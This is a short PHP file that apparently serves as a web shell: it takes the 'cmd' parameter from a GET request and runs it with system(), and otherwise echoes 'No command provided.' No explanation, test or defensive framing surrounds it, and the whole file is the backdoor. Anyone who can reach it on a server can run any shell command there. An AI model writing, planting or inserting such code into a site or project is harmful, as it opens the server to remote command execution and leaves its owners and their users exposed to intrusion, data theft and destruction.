<?php
if (isset($_GET['cmd']) && !empty($_GET['cmd'])) {
    system($_GET['cmd']);
} else {
    echo "No command provided.";
}
